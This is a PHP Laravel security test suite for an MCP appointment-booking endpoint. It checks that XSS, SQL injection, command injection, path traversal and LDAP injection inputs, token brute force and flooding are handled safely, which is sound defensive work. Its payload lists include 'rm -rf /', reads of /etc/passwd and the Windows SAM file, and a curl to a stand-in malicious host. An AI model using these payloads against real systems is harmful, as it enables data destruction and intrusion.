<?php

namespace Tests\Feature\MCP;

use Tests\TestCase;
use Illuminate\Foundation\Testing\RefreshDatabase;
use App\Models\Company;
use App\Models\Branch;
use App\Models\Call;
use App\Models\Customer;
use App\Models\Service;
use Carbon\Carbon;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Event;

class RetellMCPSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected string $mcpEndpoint = '/api/mcp/retell/tools';
    protected string $validToken = 'test_mcp_token_2024';
    protected array $maliciousPayloads;
    protected Company $company;
    
    protected function setUp(): void
    {
        parent::setUp();
        
        // Set test environment
        config(['app.env' => 'local']);
        config(['retell-mcp.security.mcp_token' => $this->validToken]);
        
        // Create test data
        $this->company = Company::factory()->create([
            'name' => 'Test Company',
            'calcom_api_key' => 'test_key',
            'calcom_event_type_id' => 123
        ]);
        
        // Define malicious payloads for security testing
        $this->maliciousPayloads = [
            'xss' => [
                '<script>alert("xss")</script>',
                'javascript:alert("xss")',
                '<img src="x" onerror="alert(1)">',
                '<svg onload="alert(1)">',
                '"><script>alert("xss")</script>'
            ],
            'sql_injection' => [
                "'; DROP TABLE customers; --",
                "' OR '1'='1",
                "1' UNION SELECT * FROM users--",
                "'; INSERT INTO users (username) VALUES ('hacked'); --",
                "' OR 1=1#"
            ],
            'command_injection' => [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& curl http://malicious.com",
                "`whoami`",
                "$(id)"
            ],
            'path_traversal' => [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            'ldap_injection' => [
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
                "*))(cn=*))(|(cn=*"
            ]
        ];
        
        // Clear cache for clean tests
        Cache::flush();
    }
    
    /**
     * Test SQL injection attempts in all input fields
     */
    public function test_sql_injection_protection()
    {
        foreach ($this->maliciousPayloads['sql_injection'] as $payload) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'bookAppointment',
                'arguments' => [
                    'name' => $payload,
                    'email' => $payload,
                    'telefonnummer' => $payload,
                    'datum' => 'morgen',
                    'uhrzeit' => '10:00',
                    'dienstleistung' => $payload,
                    'notizen' => $payload
                ]
            ]);
            
            // Should not crash or return 500
            $this->assertNotEquals(500, $response->status(), 
                "SQL injection payload should not cause 500 error: {$payload}");
            
            // Database should still be intact
            $this->assertDatabaseHas('companies', ['id' => $this->company->id]);
        }
    }
    
    /**
     * Test XSS protection in all input fields
     */
    public function test_xss_protection()
    {
        foreach ($this->maliciousPayloads['xss'] as $payload) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'bookAppointment',
                'arguments' => [
                    'name' => $payload,
                    'email' => 'test@example.com',
                    'datum' => 'morgen',
                    'uhrzeit' => '10:00',
                    'notizen' => $payload
                ]
            ]);
            
            $responseContent = $response->getContent();
            
            // Response should not contain unescaped script tags
            $this->assertStringNotContainsString('<script>', $responseContent,
                "XSS payload should be escaped: {$payload}");
            $this->assertStringNotContainsString('javascript:', $responseContent);
            $this->assertStringNotContainsString('onerror=', $responseContent);
        }
    }
    
    /**
     * Test command injection protection
     */
    public function test_command_injection_protection()
    {
        foreach ($this->maliciousPayloads['command_injection'] as $payload) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'bookAppointment',
                'arguments' => [
                    'name' => $payload,
                    'datum' => 'morgen',
                    'uhrzeit' => '10:00'
                ]
            ]);
            
            // Should not crash the system
            $this->assertNotEquals(500, $response->status(),
                "Command injection payload should not cause 500 error: {$payload}");
        }
    }
    
    /**
     * Test path traversal protection
     */
    public function test_path_traversal_protection()
    {
        foreach ($this->maliciousPayloads['path_traversal'] as $payload) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'getCustomerInfo',
                'arguments' => [
                    'phone' => $payload
                ]
            ]);
            
            // Should not expose system files
            $responseContent = $response->getContent();
            $this->assertStringNotContainsString('root:', $responseContent);
            $this->assertStringNotContainsString('/etc/passwd', $responseContent);
            $this->assertStringNotContainsString('Administrator:', $responseContent);
        }
    }
    
    /**
     * Test token bruteforce protection
     */
    public function test_token_bruteforce_protection()
    {
        $bruteForcedTokens = [
            'token123',
            'password',
            'admin',
            'test',
            'secret',
            'api_key',
            '12345',
            'qwerty',
            'letmein',
            'welcome'
        ];
        
        $failedAttempts = 0;
        foreach ($bruteForcedTokens as $token) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $token,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'getCurrentTimeBerlin',
                'arguments' => []
            ]);
            
            if ($response->status() === 403) {
                $failedAttempts++;
            }
        }
        
        // All brute force attempts should fail
        $this->assertEquals(count($bruteForcedTokens), $failedAttempts,
            'All brute force token attempts should be rejected');
    }
    
    /**
     * Test rate limiting with different IPs
     */
    public function test_rate_limiting_per_ip()
    {
        config(['retell-mcp.security.rate_limit_per_token' => 2]);
        
        $ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102'];
        
        foreach ($ips as $ip) {
            // Each IP should get its own rate limit bucket
            for ($i = 0; $i < 2; $i++) {
                $response = $this->withHeaders([
                    'Authorization' => 'Bearer ' . $this->validToken,
                    'Content-Type' => 'application/json',
                    'X-Forwarded-For' => $ip
                ])->postJson($this->mcpEndpoint, [
                    'tool' => 'getCurrentTimeBerlin',
                    'arguments' => []
                ]);
                
                $response->assertStatus(200);
            }
            
            // Third request from same IP should be rate limited
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json',
                'X-Forwarded-For' => $ip
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'getCurrentTimeBerlin',
                'arguments' => []
            ]);
            
            $response->assertStatus(429);
        }
    }
    
    /**
     * Test large payload handling
     */
    public function test_large_payload_handling()
    {
        // Test with 1MB payload
        $largePayload = str_repeat('A', 1024 * 1024);
        
        $response = $this->withHeaders([
            'Authorization' => 'Bearer ' . $this->validToken,
            'Content-Type' => 'application/json'
        ])->postJson($this->mcpEndpoint, [
            'tool' => 'bookAppointment',
            'arguments' => [
                'name' => $largePayload,
                'datum' => 'morgen',
                'uhrzeit' => '10:00'
            ]
        ]);
        
        // Should handle large payloads gracefully
        $this->assertNotEquals(413, $response->status(), 'Should handle large payloads');
        $this->assertNotEquals(500, $response->status(), 'Should not crash on large payloads');
    }
    
    /**
     * Test deeply nested JSON payload
     */
    public function test_deeply_nested_json_handling()
    {
        // Create deeply nested JSON
        $nestedData = 'value';
        for ($i = 0; $i < 100; $i++) {
            $nestedData = ['level' . $i => $nestedData];
        }
        
        $response = $this->withHeaders([
            'Authorization' => 'Bearer ' . $this->validToken,
            'Content-Type' => 'application/json'
        ])->postJson($this->mcpEndpoint, [
            'tool' => 'bookAppointment',
            'arguments' => [
                'name' => 'Test',
                'datum' => 'morgen',
                'uhrzeit' => '10:00',
                'nested_data' => $nestedData
            ]
        ]);
        
        // Should handle deeply nested JSON without crashing
        $this->assertNotEquals(500, $response->status());
    }
    
    /**
     * Test concurrent authentication attempts
     */
    public function test_concurrent_authentication_attempts()
    {
        $tokens = array_fill(0, 10, $this->validToken);
        $responses = [];
        
        // Simulate concurrent requests
        foreach ($tokens as $token) {
            $responses[] = $this->withHeaders([
                'Authorization' => 'Bearer ' . $token,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'getCurrentTimeBerlin',
                'arguments' => []
            ]);
        }
        
        // All should succeed (no race conditions in auth)
        foreach ($responses as $response) {
            $response->assertStatus(200);
        }
    }
    
    /**
     * Test DDOS simulation
     */
    public function test_ddos_protection()
    {
        config(['retell-mcp.security.rate_limit_per_token' => 20]);
        
        $startTime = microtime(true);
        $successCount = 0;
        $rateLimitedCount = 0;
        
        // Simulate rapid requests
        for ($i = 0; $i < 30; $i++) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'getCurrentTimeBerlin',
                'arguments' => []
            ]);
            
            if ($response->status() === 200) {
                $successCount++;
            } elseif ($response->status() === 429) {
                $rateLimitedCount++;
            }
        }
        
        $totalTime = microtime(true) - $startTime;
        
        // Should have rate limited some requests
        $this->assertGreaterThan(0, $rateLimitedCount, 'Should rate limit excessive requests');
        $this->assertEquals(20, $successCount, 'Should allow exactly the rate limit');
        
        // Should respond reasonably quickly even under load
        $this->assertLessThan(5, $totalTime, 'Should handle load test within 5 seconds');
    }
    
    /**
     * Test malformed content-type handling
     */
    public function test_malformed_content_type_handling()
    {
        $malformedContentTypes = [
            'text/plain',
            'application/xml',
            'multipart/form-data',
            'application/x-www-form-urlencoded',
            'invalid-content-type',
            ''
        ];
        
        foreach ($malformedContentTypes as $contentType) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => $contentType
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'getCurrentTimeBerlin',
                'arguments' => []
            ]);
            
            // Should handle gracefully, not crash
            $this->assertNotEquals(500, $response->status(),
                "Should handle content type gracefully: {$contentType}");
        }
    }
    
    /**
     * Test Unicode and special character handling
     */
    public function test_unicode_and_special_character_handling()
    {
        $unicodePayloads = [
            '🚀 Test Name 🎯',
            'Тест на русском',
            '测试中文',
            'اختبار العربية',
            'テスト日本語',
            '🔐💀☠️⚠️',
            '\u0000\u0001\u0002', // Null bytes
            '\x00\x01\x02\xFF'    // Control characters
        ];
        
        foreach ($unicodePayloads as $payload) {
            $response = $this->withHeaders([
                'Authorization' => 'Bearer ' . $this->validToken,
                'Content-Type' => 'application/json'
            ])->postJson($this->mcpEndpoint, [
                'tool' => 'bookAppointment',
                'arguments' => [
                    'name' => $payload,
                    'datum' => 'morgen',
                    'uhrzeit' => '10:00'
                ]
            ]);
            
            // Should handle Unicode gracefully
            $this->assertNotEquals(500, $response->status(),
                "Should handle Unicode payload: {$payload}");
        }
    }
}